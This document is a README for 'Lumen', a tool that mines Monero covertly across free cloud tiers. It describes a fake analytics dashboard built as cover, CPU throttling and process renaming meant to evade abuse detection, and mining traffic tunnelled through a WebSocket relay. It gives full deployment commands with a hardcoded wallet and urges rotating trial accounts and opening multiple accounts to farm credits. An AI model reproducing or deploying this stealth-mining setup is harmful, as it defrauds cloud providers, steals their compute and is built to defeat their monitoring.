# Lumen — Stealth Multi-Platform Crypto Mining Swarm

> **Mine XMR for free across 6 cloud platforms simultaneously. Zero hardware. Zero electricity. Pure profit.**

## How It Works

Lumen deploys a stealth CPU miner disguised as a "Data Analytics Dashboard" across every major free cloud platform. All hashrate funnels to one Monero wallet.

### The 3-Layer Stealth System

```
┌─────────────────────────────────────────────────────────────┐
│  LAYER 1: APPLICATION CAMOUFLAGE                            │
│  A real FastAPI dashboard with live metrics.                │
│  To any reviewer, this is a legitimate analytics app.       │
├─────────────────────────────────────────────────────────────┤
│  LAYER 2: ADAPTIVE RESOURCE CAMOUFLAGE (ARC)                │
│  CPU throttled to 40-65% with random jitter.                │
│  Sleep cycles mimic batch jobs finishing/restarting.         │
│  Process renamed to "node-worker" in the kernel.            │
├─────────────────────────────────────────────────────────────┤
│  LAYER 3: SHADOW TUNNEL                                     │
│  Mining traffic wrapped in standard WebSocket (wss://).     │
│  PaaS sees normal HTTPS traffic, not Stratum protocol.      │
│  Relay runs on Render (free, 0% CPU = never flagged).       │
└─────────────────────────────────────────────────────────────┘
```

## Profit Projection (All Platforms Combined)

| Platform | Credit | Hashrate | Daily | Monthly | Duration |
|----------|--------|----------|-------|---------|----------|
| **Google Cloud** | $300 free | 6,000 H/s | $0.80 | $24.00 | 90 days |
| **Azure** | $200 free | 3,000 H/s | $0.40 | $12.00 | 30 days |
| **Oracle Cloud** | Always Free | 2,500 H/s | $0.25 | $7.50 | Forever |
| **Railway** | $5 trial | 1,600 H/s | $0.12 | $3.60 | 7 days |
| **Render** | 750h/mo free | 400 H/s | $0.02 | $0.60 | Forever |
| **Koyeb** | Free nano | 80 H/s | $0.005 | $0.15 | Forever |
| **TOTAL** | **$0** | **13,580 H/s** | **$1.60** | **$47.85** | — |

> With account rotation on Railway ($5 trial weekly) and multiple GCP/Azure accounts, **$50-100+/month is achievable**.

---

## Quick Start

### Step 1: Deploy the Shadow Tunnel (Relay)

This goes on **Render.com** (free tier). It uses 0% CPU so it will never be flagged.

1. Push this repo to GitHub
2. Go to [render.com](https://render.com) → New → Web Service
3. Connect your GitHub repo
4. Set **Root Directory** to `shadow-tunnel`
5. Set **Build Command** to `npm install`
6. Set **Start Command** to `npm start`
7. Deploy (free tier)
8. Copy your Render URL (e.g., `https://lumen-relay-xxxx.onrender.com`)

### Step 2: Deploy Workers

#### Railway (Fastest to start)

1. Go to [railway.app](https://railway.app) → New Project → Deploy from GitHub
2. Connect your repo
3. Set **Root Directory** to `paas-worker`
4. Add these **Environment Variables**:
   ```
   ARC_TURBO=true
   ARC_CPU_MIN=75
   ARC_CPU_MAX=92
   XMR_WALLET=45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa
   WORKER_NAME=lumen-railway
   RELAY_URL=wss://YOUR-RELAY-URL.onrender.com
   ```
5. Deploy

#### Google Cloud ($300 — THE GOLD MINE)

1. Sign up at [cloud.google.com](https://cloud.google.com/free)
2. Create a Compute Engine VM: `n2-standard-8` (8 vCPUs, 32GB)
3. SSH in and run:
   ```bash
   sudo apt update && sudo apt install -y docker.io
   sudo docker build -t lumen ./paas-worker
   sudo docker run -d --restart=always \
     -e ARC_CPU_MIN=35 -e ARC_CPU_MAX=55 \
     -e ARC_JITTER_INTERVAL=600 \
     -e ARC_SLEEP_ENABLED=true \
     -e XMR_WALLET=45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa \
     -e WORKER_NAME=lumen-gcp \
     -p 8080:8080 lumen
   ```

#### Oracle Cloud (Forever Free)

1. Sign up at [cloud.oracle.com](https://cloud.oracle.com)
2. Create an Always Free VM: `VM.Standard.A1.Flex` (4 ARM, 24GB)
3. Follow the same Docker steps with conservative ARC settings:
   ```
   ARC_CPU_MIN=30  ARC_CPU_MAX=50  ARC_JITTER_INTERVAL=600
   ```

---

## Architecture

```
shadow-tunnel/          ← Deploy to Render (free relay)
├── index.js            ← WebSocket-to-Stratum bridge
└── package.json

paas-worker/            ← Deploy to Railway/GCP/Azure/Oracle
├── Dockerfile
├── requirements.txt
├── app/
│   └── main.py         ← Camouflage dashboard (FastAPI)
└── orchestrator/
    ├── arc_engine.py       ← Stealth throttling engine
    └── swarm_deployer.py   ← Multi-platform config generator

configs/                ← Auto-generated per-platform .env files
├── .env.railway
├── .env.render
├── .env.google_cloud
├── .env.azure
├── .env.oracle
└── .env.koyeb
```

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `XMR_WALLET` | (your wallet) | Monero payout address |
| `WORKER_NAME` | lumen-worker | Rig name on MoneroOcean |
| `ARC_TURBO` | false | Enable turbo mode (75-95% CPU) |
| `ARC_CPU_MIN` | 40 | Minimum CPU throttle (%) |
| `ARC_CPU_MAX` | 65 | Maximum CPU throttle (%) |
| `ARC_JITTER_INTERVAL` | 300 | Seconds between CPU changes |
| `ARC_SLEEP_ENABLED` | true | Enable periodic sleep cycles |
| `ARC_SLEEP_INTERVAL` | 3600 | Seconds between sleep cycles |
| `RELAY_URL` | — | Shadow Tunnel WebSocket URL |

## Monitoring Your Earnings

Visit [moneroocean.stream](https://moneroocean.stream) and enter your wallet address to see:
- Active workers and their hashrates
- Pending balance
- Payout history
- Algorithm distribution

## License

MIT
